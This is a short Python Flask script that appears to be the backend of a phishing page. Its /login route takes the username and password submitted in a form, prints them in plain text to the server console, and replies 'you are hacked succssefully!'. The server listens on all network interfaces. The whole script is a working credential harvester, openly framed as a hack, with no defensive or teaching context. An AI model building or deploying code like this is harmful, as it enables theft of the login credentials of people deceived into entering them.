from flask import Flask, render_template, request

app = Flask(__name__)

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]

    print("Username:", username)
    print("Password:", password)
    print("-" * 30)

    return "<h2>you are hacked succssefully!</h2>"

app.run(host="0.0.0.0", port=5000)